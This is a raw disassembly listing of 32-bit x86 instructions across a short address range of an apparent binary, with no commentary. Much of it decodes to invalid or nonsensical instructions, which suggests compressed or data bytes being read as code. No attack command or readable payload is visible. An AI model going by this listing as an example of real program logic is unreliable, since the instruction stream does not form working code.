  4179c5:	retf   0xd0fe
  4179c8:	inc    esp
  4179c9:	pushf  
  4179ca:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4179cb:	sahf   
  4179cc:	mov    al,al
  4179ce:	shl    BYTE PTR [edx+edi*2],cl
  4179d1:	sub    DWORD PTR [eax+0x6176de70],ebx
  4179d7:	hlt    
  4179d8:	mov    dl,0xcc
  4179da:	push   ebp
  4179db:	stos   BYTE PTR es:[edi],al
  4179dc:	(bad)  
  4179dd:	aam    0x6b
  4179df:	ja     0x4179e1
  4179e1:	add    BYTE PTR [eax+0xb3a4],al
  4179e7:	add    BYTE PTR [eax+0x50],dl
  4179ea:	push   eax
  4179eb:	push   eax
  4179ec:	push   eax
  4179ed:	push   eax
  4179ee:	push   eax
  4179ef:	push   eax
  4179f0:	push   eax
  4179f1:	add    DWORD PTR [ecx+0x47],0x0
	...
  4179fd:	mov    DWORD PTR [ecx-0x38f5338e],ecx
  417a03:	clc    
  417a04:	int3   
  417a05:	sbb    bh,BYTE PTR [edx]
  417a07:	jecxz  0x417a1f
  417a09:	aad    0x91
  417a0b:	xor    eax,0x54bdd461
  417a10:	and    BYTE PTR [ebx-0x37],bh
  417a13:	xchg   esp,eax
  417a14:	push   edi
  417a15:	cmp    al,0xfa
  417a17:	mov    DWORD PTR [ecx-0x7676ccf0],ecx
  417a1d:	pop    ebp
  417a1e:	fmul   DWORD PTR [ecx-0x62b88577]
  417a24:	repz and DWORD PTR [edi+0x2a],ecx
  417a28:	jo     0x417a70
  417a2a:	xlat   BYTE PTR ds:[ebx]
  417a2b:	fs out 0x62,al
  417a2e:	add    eax,0x7f482014
  417a33:	jg     0x4179ca
  417a35:	or     al,0xb8
  417a37:	aad    0xab
  417a39:	mov    DWORD PTR [ebp+0x61],esi
  417a3c:	fwait
  417a3d:	inc    esp
  417a3e:	sub    esi,DWORD PTR [ebp+0x75]
  417a41:	jne    0x417aba
  417a43:	cmp    bh,BYTE PTR [ebp+0x37]
  417a46:	repz jecxz 0x417ab2
  417a49:	(bad)  
  417a4b:	div    BYTE PTR [ebp+0x5b1f6bf0]
  417a51:	lds    esp,FWORD PTR [eax+0x5626e14c]
  417a57:	imul   edx,DWORD PTR [ecx],0xc7b88aa2
  417a5d:	arpl   WORD PTR [edx],di
  417a5f:	jns    0x417aa0
  417a61:	ins    DWORD PTR es:[edi],dx
  417a62:	xchg   edi,eax
  417a63:	lods   al,BYTE PTR ds:[esi]
  417a64:	repz jne 0x417adc
  417a67:	xor    al,0xbd
  417a69:	jne    0x417ae0
  417a6b:	jne    0x417a55
  417a6d:	call   0xe92a635a
  417a72:	call   0x3848635f
  417a77:	cmc    
	...
  417a80:	add    BYTE PTR [eax],al
  417a82:	add    al,bh
  417a84:	xchg   BYTE PTR ss:[edi+0x30],al
  417a88:	ins    DWORD PTR es:[edi],dx
  417a89:	(bad)  
  417a8b:	push   cs
  417a8c:	jmp    0x3913:0xb98830a4
  417a93:	add    eax,0x69f18aab
  417a98:	pop    ds
  417a99:	inc    ebp
  417a9a:	and    DWORD PTR [eax],eax
  417a9c:	add    BYTE PTR [edx],al
  417a9e:	(bad)  
  417a9f:	mov    ecx,0x4d8606c9
  417aa4:	mov    dl,0xb
  417aa6:	div    DWORD PTR [ebx+0x4ccd8b84]
  417aac:	mov    bl,0xac
  417aae:	or     al,0xff
  417ab0:	dec    ecx
  417ab1:	daa    
  417ab2:	sbb    bl,BYTE PTR [ecx+0x683e3a7]
  417ab8:	mov    ds:0x930000f7,eax
  417abd:	dec    eax
  417abe:	dec    esp
  417abf:	add    BYTE PTR [eax],al
  417ac1:	out    dx,eax
  417ac2:	push   ecx
  417ac3:	retf   0xff00
  417ac6:	inc    esi
  417ac7:	cmc    
  417ac8:	ins    BYTE PTR es:[edi],dx
  417ac9:	or     eax,DWORD PTR [ecx+0x3b64a3be]
  417acf:	les    ebp,FWORD PTR [edx+0x5bd99fb8]
  417ad5:	jno    0x417ac7
  417ad7:	push   ds
  417ad8:	adc    al,0xfe
  417ada:	sbb    al,0x4a
  417adc:	fdivr  QWORD PTR [edi+edi*8]
  417adf:	(bad)  
  417ae0:	call   eax
  417ae2:	xchg   bh,bh
  417ae4:	inc    DWORD PTR [ecx-0x53]
	...
  417af2:	add    BYTE PTR [esp+edx*8-0x5fd855d8],cl
  417af9:	jnp    0x417b1d
  417afb:	dec    ecx
  417afc:	xor    bl,al
  417afe:	pop    ecx
  417aff:	or     al,0xe6
  417b01:	aaa    
  417b02:	and    BYTE PTR [edi+edx*2-0x15f00b12],cl
  417b09:	in     al,dx
  417b0a:	scas   eax,DWORD PTR es:[edi]
  417b0b:	mov    ecx,DWORD PTR [ebx-0x74747475]
  417b11:	mov    ecx,DWORD PTR [ebx-0x6ebaba75]
  417b17:	cs ror ebp,cl
  417b1a:	inc    ebp
  417b1b:	inc    ebp
  417b1c:	jb     0x417b6f
  417b1e:	icebp  
  417b1f:	pop    ebx
  417b20:	xor    al,0x97
  417b22:	(bad)  
  417b23:	sbb    eax,0xb05a9b75
  417b28:	add    BYTE PTR [edi-0x56],ah
  417b2b:	xor    ah,BYTE PTR [edi+eax*8]
  417b2e:	sar    BYTE PTR [ecx],cl
  417b30:	dec    esi
  417b31:	xchg   esi,eax
  417b32:	xchg   edx,eax
  417b33:	sbb    ebx,DWORD PTR [ebx]
  417b35:	and    DWORD PTR [esi],ecx
  417b37:	popf   
  417b38:	(bad)  
  417b39:	mov    esp,0x7e20f2d9
  417b3e:	and    al,BYTE PTR [ebp+0x45]
  417b41:	shr    DWORD PTR [ebx-0x292babb],0x47
  417b48:	inc    ebp
  417b49:	add    BYTE PTR [ebx],ch
  417b4b:	dec    DWORD PTR [ecx+esi*2]
  417b4e:	push   eax
  417b4f:	je     0x417bb6
  417b51:	xor    ecx,ecx
  417b53:	push   ds
  417b54:	ret    0xcf83
  417b57:	pop    ebx
  417b58:	dec    edi
  417b59:	mov    esp,0xbd456fe0
  417b5e:	inc    eax
  417b5f:	mov    edi,0xbacc
  417b64:	add    BYTE PTR [eax-0x16],dl
  417b67:	jno    0x417b64
  417b69:	mov    ch,0xfd
  417b6b:	cmp    edi,DWORD PTR [edi-0x21ba80b7]
  417b71:	pop    eax
  417b72:	mov    ds:0x572b4188,al
  417b77:	mov    ecx,ebx
  417b79:	call   0x3592e7e4
  417b7e:	push   ecx
  417b7f:	cmp    esp,eax
  417b81:	mov    eax,DWORD PTR [eax]
  417b83:	add    BYTE PTR [ebp+0xc108],ch
	...
  417b91:	add    BYTE PTR [eax],al
  417b93:	inc    esi
  417b94:	rol    BYTE PTR [ebp+0x0],1
  417b9a:	add    BYTE PTR [eax],al
  417b9c:	add    BYTE PTR [eax],al
  417b9e:	add    bh,bh
  417ba0:	and    BYTE PTR [ebp+0x29],ch
  417ba3:	jb     0x417bb2
  417ba5:	inc    ecx
  417ba6:	and    BYTE PTR [ebx+0xa],al
  417ba9:	and    BYTE PTR [bp+di+0x73],ch
  417bad:	arpl   WORD PTR [eax],bp
  417baf:	and    BYTE PTR [ecx+0x3e],ch
  417bb2:	cmp    dh,BYTE PTR [ebx+0x76]
  417bb5:	sub    BYTE PTR [eax+0x3e],dh
  417bb8:	and    BYTE PTR [edx+0x20],dh
  417bbb:	jb     0x417c2c
  417bbd:	imul   esp,DWORD PTR [ebp+0x61],0x696d573c
  417bc4:	ins    DWORD PTR es:[edi],dx
  417bc5:	imul   esi,DWORD PTR gs:[ebx+0x74],0x726f6f4d
  417bcd:	push   edx
  417bce:	outs   dx,BYTE PTR ds:[esi]
  417bcf:	outs   dx,DWORD PTR ds:[esi]
  417bd0:	imul   ebp,DWORD PTR [esi],0x72756563
  417bd6:	arpl   WORD PTR [ebx+0x65],si
  417bd9:	cmp    al,0x78
  417bdb:	outs   dx,DWORD PTR ds:[esi]
  417bdc:	inc    ecx
  417bdd:	gs arpl WORD PTR fs:[eax],sp
  417be1:	jae    0x417c55
  417be3:	gs imul esp,DWORD PTR gs:[ebp+0x3c],0x6d656f62
  417bec:	ins    BYTE PTR es:[edi],dx
  417bed:	push   eax
  417bee:	ins    DWORD PTR es:[edi],dx
  417bef:	imul   esp,DWORD PTR ds:[ecx+0x65],0x3e0d6522
  417bf7:	ins    DWORD PTR es:[edi],dx
  417bf8:	outs   dx,DWORD PTR gs:[esi]
  417bfa:	dec    esp
  417bfb:	arpl   WORD PTR [eax],sp
  417bfd:	jae    0x417c52
  417bff:	imul   ebp,DWORD PTR [ebp+0x74],0x6f64203c
  417c06:	jb     0x417c6a
  417c08:	jmp    FWORD PTR [ebx+0x5b]
  417c0b:	out    0x11,eax
  417c0d:	mov    esi,ds
  417c0f:	ret    
  417c10:	inc    edx
  417c11:	mov    al,ds:0x999ea0ae
  417c16:	lock cmp al,0x71
  417c19:	ror    BYTE PTR [ebx],1
  417c1b:	(bad)  
  417c1c:	retf   0x3b06
  417c1f:	adc    edi,esp
  417c21:	(bad)  
  417c22:	(bad)  
  417c23:	out    dx,eax
  417c24:	mov    al,ds:0x40e2ffff
  417c29:	(bad)  
  417c2a:	(bad)  
  417c2b:	fidiv  WORD PTR [ebx+0x49f827f1]
  417c31:	aaa    
  417c32:	xor    BYTE PTR [ebp+0x5dd8a165],0x69
  417c39:	mov    cs,WORD PTR [ebx-0x16]
  417c3c:	push   esi
  417c3d:	stos   BYTE PTR es:[edi],al
  417c3e:	sbb    ecx,ebx
  417c40:	adc    BYTE PTR [eax-0x72],0xff
  417c44:	add    BYTE PTR [eax+ebp*1-0x4],dh
  417c48:	push   edx
  417c49:	add    BYTE PTR [eax],al
  417c4b:	add    BYTE PTR [edx],cl
  417c4d:	lea    eax,[ebp-0x18]
  417c50:	xchg   DWORD PTR [edx+0x2f9c4bf6],ecx
  417c56:	mov    edx,?
  417c58:	loope  0x417cc8
  417c5a:	jl     0x417ca4
  417c5c:	jns    0x417cb9
  417c5e:	ins    BYTE PTR es:[edi],dx
  417c5f:	pop    es
  417c60:	loop   0x417caa
  417c62:	ret    0x8fea
  417c65:	int3   
  417c66:	fidiv  WORD PTR [ebp+0x4f]
  417c69:	inc    ebx
  417c6a:	jno    0x417c0f
  417c6c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417c6d:	adc    ebp,DWORD PTR [eax+0x0]
  417c70:	add    BYTE PTR [edi+0x6],cl
	...
  417c7f:	xlat   BYTE PTR ds:[ebx]
  417c80:	fcom   QWORD PTR [ebp-0x1]
  417c86:	(bad)  
  417c87:	(bad)  
  417c88:	(bad)  
  417c89:	(bad)  
  417c8a:	inc    DWORD PTR [esp+eax*1]
  417c8d:	mov    dh,0xe5
  417c8f:	push   ebx
  417c90:	movs   BYTE PTR es:[edi],BYTE PTR es:[esi]
  417c92:	test   eax,0x5aa64b78
  417c97:	call   0xa13e9bbc
  417c9c:	iret   
  417c9d:	imul   esp,DWORD PTR [ebx],0x66
  417ca0:	push   esi
  417ca1:	in     al,dx
  417ca2:	dec    esp
  417ca3:	(bad)  
  417ca4:	mov    bl,0x4
  417ca6:	add    al,0x16
  417ca8:	into   
  417ca9:	xchg   DWORD PTR [ebx],eax
  417cab:	xor    BYTE PTR [edx+0x91400be],dl
  417cb1:	add    eax,0xdd0e61d2
  417cb6:	adc    DWORD PTR [ebp+0x327dc84e],ebx
  417cbc:	iret   
  417cbd:	mov    cl,0x3
  417cbf:	adc    BYTE PTR [edi-0x5d],ch
  417cc2:	jae    0x417d36
  417cc4:	add    al,0x4
  417cc6:	in     al,dx
  417cc7:	(bad)  
  417cc8:	dec    ebx
  417cc9:	add    al,0x4
  417ccb:	sub    eax,0x8b04cf39
  417cd0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417cd1:	cli    
  417cd2:	xlat   BYTE PTR ds:[ebx]
  417cd3:	lock enter 0xc551,0x65
  417cd8:	imul   ecx,DWORD PTR [eax-0x14],0xffffff9c
  417cdc:	rol    BYTE PTR [eax-0x7fb42250],0x2b
  417ce3:	sti    
  417ce4:	cmp    DWORD PTR [ebx-0x7474f09f],eax
  417cea:	mov    ebx,eax
  417cec:	mov    ecx,0xa8838b8b
  417cf1:	mov    ecx,DWORD PTR [ebx+0x5050508b]
  417cf7:	push   eax
  417cf8:	push   eax
  417cf9:	push   eax
  417cfa:	push   eax
  417cfb:	push   eax
  417cfc:	push   eax
  417cfd:	jg     0x417ca9
  417cff:	cmp    eax,0x19a830f0
  417d04:	add    al,0x98
  417d06:	call   0x418c54b9
  417d0b:	or     BYTE PTR [edx+0x37],cl
  417d0e:	pop    es
  417d0f:	dec    edx
  417d10:	jmp    0x417d4a
  417d12:	sahf   
  417d13:	xor    eax,0x858585ee
  417d18:	test   DWORD PTR [ebp-0x7a7a7a7b],eax
  417d1e:	inc    ebp
  417d1f:	inc    ebp
  417d20:	adc    eax,0x45b23735
  417d25:	inc    ebp
  417d26:	sub    eax,0xbfe261dc
  417d2b:	jnp    0x417d10
  417d2d:	cwde   
  417d2e:	push   cs
  417d2f:	or     DWORD PTR [ebp+0x5a3032dd],esp
  417d35:	sbb    BYTE PTR cs:[ecx-0x5f25f354],dh
  417d3c:	jecxz  0x417db7
  417d3e:	xchg   ebp,eax
  417d3f:	mov    ebp,0x47778a89
  417d44:	imul   edi,esp
  417d47:	dec    esi
  417d48:	and    eax,DWORD PTR [ebp+0x45]
  417d4b:	retf   
  417d4c:	add    DWORD PTR [ebp+0x45],0x4528b3ef
  417d53:	add    BYTE PTR [esi],dl
  417d55:	jbe    0x417dac
  417d57:	inc    ecx
  417d58:	aas    
  417d59:	adc    ah,BYTE PTR [eax-0x42]
  417d5c:	sub    BYTE PTR [edx-0x71],al
  417d5f:	mov    al,ds:0xf3c14935
  417d64:	mov    esi,0xe9f777f9
  417d69:	and    eax,0x551a
  417d6e:	add    dh,bh
  417d70:	push   0x5b6da9c
  417d75:	test   DWORD PTR [edi+0x8],ebx
  417d78:	xor    al,BYTE PTR [eax]
  417d7a:	pop    ebx
  417d7b:	inc    ebx
  417d7c:	mov    al,ds:0xda8b9c4e
  417d81:	cmp    eax,esp
  417d83:	push   ebx
  417d84:	or     DWORD PTR [ecx],0x3028fca3
  417d8a:	mov    ch,0x6c
  417d8c:	add    BYTE PTR [eax],al
  417d8e:	inc    eax
  417d8f:	inc    esp
  417d90:	aam    0x0
  417d92:	add    BYTE PTR [eax],al
  417d94:	int3   
  417d95:	int3   
  417d96:	int3   
  417d97:	int3   
  417d98:	int3   
  417d99:	int3   
  417d9a:	int3   
  417d9b:	int3   
  417d9c:	int3   
  417d9d:	add    ebx,edi
  417d9f:	mov    ebp,0xffffffff
  417da4:	(bad)  
  417da5:	(bad)  
  417da6:	(bad)  
  417da7:	(bad)  
  417da8:	inc    DWORD PTR [eax]
  417daa:	add    BYTE PTR [ebx-0x1e],bh
  417dad:	pop    ebp
  417dae:	out    0xaf,eax
  417db0:	dec    ebx
  417db1:	mov    bl,0xf
  417db3:	mov    ch,0xaa
  417db5:	dec    eax
  417db6:	call   0x474d64d3
  417dbb:	scas   eax,DWORD PTR es:[edi]
  417dbc:	jmp    0x3a9d87bf
  417dc1:	add    eax,0xdb0000e5
  417dc6:	test   eax,0x88ea0000
  417dcb:	add    BYTE PTR [eax],al
  417dcd:	cmc    
  417dce:	dec    esi
  417dcf:	jg     0x417e0d
  417dd1:	add    eax,edx
  417dd3:	or     dl,BYTE PTR [ecx-0x271c3c1d]
  417dd9:	ins    DWORD PTR es:[edi],dx
  417dda:	arpl   WORD PTR [ebp-0x2ce45170],sp
  417de0:	rcr    BYTE PTR [edi-0x7],1
  417de3:	jl     0x417dc2
  417de5:	add    BYTE PTR [eax],al
  417de7:	push   0x796d8f
  417dec:	add    BYTE PTR [eax],al
  417dee:	push   ebp
  417def:	mov    cl,0xc3
  417df1:	xchg   ebx,eax
  417df2:	fst    QWORD PTR [edi-0x39]
  417df5:	cli    
  417df6:	cmp    ch,BYTE PTR [esi+edx*4]
  417df9:	sbb    DWORD PTR [ebx+0x7c32bc4d],esp
  417dff:	fcmove st,st(6)
  417e01:	xchg   esi,eax
  417e02:	cli    
  417e03:	jge    0x417e45
  417e05:	cmp    al,0xf9
  417e07:	mov    BYTE PTR [eax-0x15],0xa4
  417e0b:	aad    0x8c
  417e0d:	ret    0xbc06
  417e10:	mov    eax,ds:0x21eb0000
	...
  417e21:	xchg   edx,ebp
  417e23:	push   ebp
  417e24:	mov    DWORD PTR [ecx-0x76767677],ecx
  417e2a:	mov    DWORD PTR [ecx+0x23000089],ecx
  417e30:	imul   esi,eax,0xa2391ac1
  417e36:	mov    BYTE PTR [edi+0x4b6513e8],cl
  417e3c:	cs sti 
  417e3e:	push   cs
  417e3f:	jmp    0x66214d96
  417e44:	retf   0x830b
  417e47:	add    BYTE PTR [eax],al
  417e49:	in     al,dx
  417e4a:	sbb    esi,DWORD PTR [esi+0x20b6a9e8]
  417e50:	mov    bl,0x64
  417e52:	pop    ebx
  417e53:	pop    ebp
  417e54:	sub    al,0x83
  417e56:	leave  
  417e57:	add    al,0x74
  417e59:	push   ebx
  417e5a:	pop    edx
  417e5b:	push   edi
  417e5c:	pusha  
  417e5d:	fdiv   DWORD PTR [edx+0x3a5f940f]
  417e63:	cmp    ebx,ecx
  417e65:	dec    eax
  417e66:	add    BYTE PTR [eax],al
  417e68:	add    ch,al
  417e6a:	rol    DWORD PTR [eax],0x0
  417e6d:	pusha  
  417e6e:	cdq    
  417e6f:	jbe    0x417e71
  417e71:	(bad)  
  417e72:	(bad)  
  417e74:	ds cmp eax,0xffd28430
  417e7a:	jmp    0x964f:0x3f283168
  417e81:	inc    edi
  417e82:	loopne 0x417e2c
  417e84:	cdq    
  417e85:	scas   al,BYTE PTR es:[edi]
  417e86:	add    edi,DWORD PTR [edi-0x4a]
  417e89:	dec    esi
  417e8a:	(bad)  
  417e8b:	(bad)  
  417e8c:	push   DWORD PTR [ebp+edx*4-0x1]
  417e90:	call   FWORD PTR [edi-0x57]
  417e96:	mov    DWORD PTR [ecx-0x76767677],ecx
  417e9c:	mov    DWORD PTR [ecx-0x7c13ec77],ecx
  417ea2:	ja     0x417eea
  417ea4:	push   edi
  417ea5:	bound  esp,QWORD PTR [ebx]
  417ea7:	mov    al,dh
  417ea9:	jo     0x417f09
  417eab:	sbb    al,0x1d
  417ead:	cmp    ecx,esi
  417eaf:	jl     0x417f0f
  417eb1:	in     eax,dx
  417eb2:	push   ebx
  417eb3:	sar    BYTE PTR [edx+0x4c],0x19
	...
  417ebf:	add    BYTE PTR [edi],cl
  417ec1:	movups xmm5,xmm1
  417ec4:	scas   al,BYTE PTR es:[edi]
  417ec5:	test   eax,0x4c0c0f0f
  417eca:	pop    esp
  417ecb:	add    cl,BYTE PTR [edi-0x12]
  417ece:	pop    ecx
  417ecf:	(bad)  
  417ed0:	dec    ecx
  417ed1:	sar    ch,1
  417ed3:	ins    BYTE PTR es:[edi],dx
  417ed4:	ja     0x417f3e
  417ed6:	aam    0xea
  417ed8:	adc    ah,BYTE PTR [esi+0x1f]
  417edb:	sub    esp,eax
  417edd:	sbb    eax,0x2d304a18
  417ee2:	iret   
  417ee3:	jl     0x417eb3
  417ee5:	cmc    
  417ee6:	dec    ebp
  417ee7:	enter  0x790e,0x82
  417eeb:	(bad)  
  417eec:	movhps xmm3,QWORD PTR [esi]
  417eef:	(bad)  
  417ef0:	movsx  ebx,bh
  417ef3:	test   DWORD PTR [edi],ecx
  417ef5:	add    BYTE PTR [esi],dl
  417ef7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417ef8:	xchg   ebp,eax
  417ef9:	mov    ch,BYTE PTR [edi+0x6013acaf]
  417eff:	data16 xor al,0x89
  417f02:	adc    ebp,ebx
  417f04:	adc    esp,DWORD PTR [esi-0x6c]
  417f07:	in     al,0x11
  417f09:	jmp    0x0:0x3036dae
  417f10:	add    BYTE PTR [ecx+0x2e63410a],ah
  417f16:	and    BYTE PTR [edi+0x41],ch
  417f19:	bound  edi,QWORD PTR [eax+0x3d]
  417f1c:	das    
  417f1d:	and    BYTE PTR [ebp+0x2e],ch
  417f20:	ins    DWORD PTR es:[edi],dx
  417f21:	inc    ecx
  417f22:	imul   ecx,DWORD PTR ds:0x65430a65,0x6363673c
  417f2c:	jbe    0x417fa0
  417f2e:	popa   
  417f2f:	inc    ebx
  417f30:	popa   
  417f31:	dec    ebp
  417f32:	dec    ebp
  417f33:	je     0x417f9e
  417f35:	bound  ebp,QWORD PTR [ebp+0x41]
  417f38:	push   ebx
  417f39:	jo     0x417fad
  417f3b:	jo     0x417fa2
  417f3d:	cmp    eax,0x28726d6d
  417f42:	push   eax
  417f43:	bound  edx,QWORD PTR [edi+0x64]
  417f46:	dec    ebp
  417f47:	gs gs cmp al,0x23
  417f4b:	jb     0x417f6d
  417f4d:	arpl   WORD PTR [ebx+0x43],si
  417f50:	imul   esp,DWORD PTR gs:[ebp+0x6f],0x53206565
  417f58:	and    ah,BYTE PTR [edi+0x62]
  417f5b:	and    BYTE PTR [esi+0x22],ch
  417f5e:	ins    DWORD PTR es:[edi],dx
  417f5f:	and    BYTE PTR [ecx+0x74],ch
  417f62:	jb     0x417fc6
  417f64:	bound  esp,QWORD PTR [ebp+0x6d]
  417f67:	imul   esp,DWORD PTR [eax],0x63652061
  417f6d:	ins    DWORD PTR es:[edi],dx
  417f6e:	jbe    0x417f7a
  417f70:	je     0x417fdb
  417f72:	jbe    0x417fd9
  417f74:	jns    0x417f98
  417f76:	jb     0x417f82
  417f78:	outs   dx,BYTE PTR ds:[esi]
  417f79:	or     eax,0x6d6e6141
  417f7e:	jb     0x417fe2
  417f80:	pop    ebp
  417f81:	ins    DWORD PTR es:[edi],dx
  417f82:	bound  esp,QWORD PTR [ebp+0x2e]
  417f85:	bound  esp,QWORD PTR [eax]
  417f87:	popa   
  417f88:	outs   dx,DWORD PTR ds:[esi]
  417f89:	cs jo  0x417ff5
  417f8c:	ins    DWORD PTR es:[edi],dx
  417f8d:	ins    DWORD PTR es:[edi],dx
  417f8e:	jae    0x417ff0
  417f90:	ret    0xf039
  417f93:	mov    ebx,0x7f450079
  417f98:	js     0x417f3f
  417f9a:	ret    
  417f9b:	adc    al,0x20
  417f9d:	adc    eax,0x48c0a63e
  417fa2:	mov    eax,ds:0x3af7a374
  417fa7:	out    dx,al
  417fa8:	rcr    DWORD PTR [edx],0x36
  417fab:	add    BYTE PTR [eax],al
  417fad:	out    dx,eax
  417fae:	iret   
  417faf:	pop    edi
	...
  417fbc:	jecxz  0x417fc4
  417fbe:	add    BYTE PTR es:[eax],al
	...
  417fc9:	add    bl,bh
  417fcb:	mov    esp,0xd0b48b8f
  417fd0:	and    eax,0x6b70d8c1
  417fd5:	push   cs
  417fd6:	fdiv   QWORD PTR [esp+ebx*2]
  417fd9:	retf   0x9f3a
  417fdc:	push   edx
  417fdd:	(bad)  
  417fde:	outs   dx,BYTE PTR ds:[esi]
  417fdf:	xor    eax,ebp
  417fe1:	leave  
  417fe2:	add    BYTE PTR [eax],al
  417fe4:	pop    ds
  417fe5:	push   ss
  417fe6:	add    BYTE PTR [eax],al
  417fe8:	pop    edx
  417fe9:	sub    DWORD PTR [eax],eax
  417feb:	add    BYTE PTR [ebx-0x2a],ch
  417fee:	push   cs
  417fef:	popa   
  417ff0:	imul   esp,DWORD PTR [edx],0xffffff95
  417ff3:	and    DWORD PTR [esi],ecx
  417ff5:	in     eax,0x68
  417ff7:	push   ebp
  417ff8:	add    al,0x53
  417ffa:	out    dx,eax
  417ffb:	push   ecx
  417ffc:	and    DWORD PTR [ecx-0xc5c09b9],ecx
  418002:	mov    eax,0x260000b2
  418007:	mov    al,ds:0xe6d3
  41800c:	add    BYTE PTR [ebp-0x11],dh
  41800f:	out    dx,al
  418010:	ret    
  418011:	cmp    ebx,esp
  418013:	repnz stos DWORD PTR es:[edi],eax
  418015:	jge    0x418070
  418017:	dec    ebp
  418018:	hlt    
  418019:	and    ecx,DWORD PTR [esi+ecx*1+0x33ce7fb8]
  418020:	mov    bl,0xd2
  418022:	clc    
  418023:	ins    BYTE PTR es:[edi],dx
  418024:	jmp    0x3b06df27
  418029:	inc    ebx
  41802a:	ss pop esp
  41802c:	leave  
  41802d:	mov    ds:0x36d7,al
  418032:	cld    
  418033:	jns    0x418035
  418035:	add    BYTE PTR [eax],al
  418037:	call   0xe92a6924
  41803c:	call   0x902a6929
  418041:	aaa    
  418042:	aad    0xff
  418044:	(bad)  
  418045:	(bad)  
  418046:	(bad)  
  418047:	(bad)  
  418048:	(bad)  
  418049:	(bad)  
  41804a:	(bad)  
  41804b:	inc    DWORD PTR [eax]
  41804d:	add    BYTE PTR [esp+eiz*8+0x65],dl
  418051:	je     0x417fe6
  418053:	mov    eax,ds:0x218ee8bc
  418058:	pop    esp
  418059:	jnp    0x41805a
  41805b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41805c:	sub    eax,0x96fdc4e4
  418061:	jno    0x4180ce
  418063:	cs out 0x19,eax
  418066:	add    BYTE PTR [eax],al
  418068:	lods   eax,DWORD PTR ds:[esi]
  418069:	sbb    al,0x85
  41806b:	mov    bh,0x52
  41806d:	dec    esp
  41806e:	popa   
  41806f:	pop    edx
  418070:	and    al,0xee
  418072:	lods   al,BYTE PTR ds:[esi]
  418073:	adc    DWORD PTR [ecx+edx*8+0x1fba4a1a],eax
  41807a:	inc    edx
  41807b:	js     0x418079
  41807d:	pop    es
  41807e:	je     0x4180a7
  418080:	pop    ss
  418081:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418082:	clc    
  418083:	test   esp,ebp
  418085:	add    BYTE PTR [eax],al
  418087:	or     eax,0xb50d
  41808c:	sub    DWORD PTR [ecx-0x1cffff9d],edi
  418092:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418093:	pop    eax
  418094:	not    edi
  418096:	pop    esi
  418097:	out    dx,eax
  418098:	in     eax,dx
  418099:	xor    eax,0xe168800e
  41809e:	shr    DWORD PTR [ecx+edi*2],0x2f
  4180a2:	in     eax,dx
  4180a3:	lea    edx,[edx+0x4978b5e3]
  4180a9:	add    BYTE PTR [eax],al
  4180ab:	add    BYTE PTR [esp+esi*4],al
  4180ae:	add    BYTE PTR [eax],al
  4180b0:	or     DWORD PTR [ebx+0x0],eax
	...
  4180be:	add    eax,0x715114ab
  4180c3:	and    eax,0xe86912de
  4180c8:	pop    esp
  4180c9:	dec    edi
  4180ca:	stos   DWORD PTR es:[edi],eax
  4180cb:	popa   
  4180cc:	add    al,0x62
  4180ce:	dec    ecx
  4180cf:	or     DWORD PTR [eax-0x1e],edx
  4180d2:	je     0x418110
  4180d4:	fcmovnbe st,st(3)
  4180d6:	(bad)  
  4180d7:	(bad)  
  4180d8:	(bad)  
  4180d9:	(bad)  
  4180da:	(bad)  
  4180db:	(bad)  
  4180dc:	(bad)  
  4180dd:	(bad)  
  4180de:	inc    DWORD PTR [ebx-0x4299f87d]
  4180e4:	dec    esp
  4180e5:	add    DWORD PTR [ebx-0x4d71496e],0x77
  4180ec:	push   ecx
  4180ed:	data16 fnstcw WORD PTR [esi-0x49]
  4180f1:	mov    BYTE PTR [ecx],al
  4180f3:	pop    ecx
  4180f4:	adc    BYTE PTR [edx],cl
  4180f6:	fld    DWORD PTR [ecx+0xdfdf116]
  4180fc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4180fd:	mov    ds:0x5cea005f,eax
  418102:	pop    ecx
  418103:	iret   
  418104:	mov    esi,0xf80e1b1c
  418109:	mov    esi,0x31eb8383
  41810e:	add    DWORD PTR [ebx-0x7c49dcf3],0x0
  418115:	add    al,0x2b
  418117:	xlat   BYTE PTR ds:[ebx]
  418118:	inc    ecx
  418119:	(bad)  
  41811a:	xor    dl,BYTE PTR [edi]
  41811c:	xchg   esi,eax
  41811d:	lods   al,BYTE PTR ds:[esi]
  41811e:	sar    BYTE PTR [ebx+eax*2-0x4a],0x93
  418123:	js     0x418112
  418125:	dec    esp
  418126:	nop
  418127:	adc    ecx,esi
  418129:	mov    eax,0xc4be8a
  41812e:	add    BYTE PTR [eax],al
  418130:	out    0x96,al
  418132:	je     0x41817c
  418134:	in     al,0x5e
  418136:	out    dx,eax
  418137:	xor    DWORD PTR [ecx+0x2ae3bd25],ebp
  41813d:	outs   dx,DWORD PTR ds:[esi]
  41813e:	dec    eax
  41813f:	hlt    
  418140:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418141:	neg    DWORD PTR [ebp+0x75]
  418144:	dec    ebp
  418145:	scas   al,BYTE PTR es:[edi]
  418146:	jmp    0x57ce:0x7dbe50cf
  41814d:	add    BYTE PTR [eax],al
  41814f:	pop    ecx
  418150:	xchg   esp,eax
  418151:	mov    ds:0x0,eax
	...
  41815e:	sbb    BYTE PTR [esi],cl
  418160:	push   esi
  418161:	inc    ebp
  418162:	inc    ebp
  418163:	inc    ebp
  418164:	inc    ebp
  418165:	inc    ebp
  418166:	inc    ebp
  418167:	inc    ebp
  418168:	inc    ebp
  418169:	inc    ebp
  41816a:	mov    ecx,DWORD PTR [ebx-0xb5044ac]
  418170:	inc    ebp
  418171:	in     eax,0xa2
  418173:	fdivr  QWORD PTR [esi-0x1]
  418176:	mov    bl,0x27
  418178:	jg     0x4181ba
  41817a:	jge    0x41817e
  41817c:	and    BYTE PTR [ebp+0x39],ch
  41817f:	mul    bl
  418181:	push   edi
  418182:	xchg   esp,eax
  418183:	sub    BYTE PTR [ebx-0x74d23675],cl
  418189:	mov    esi,DWORD PTR [ebp+0x4f]
  41818c:	mov    ecx,DWORD PTR [ebx+0x7afe7156]
  418192:	(bad)  
  418193:	mov    edi,0x55f5eafc
  418198:	and    ebp,ebp
  41819a:	aaa    
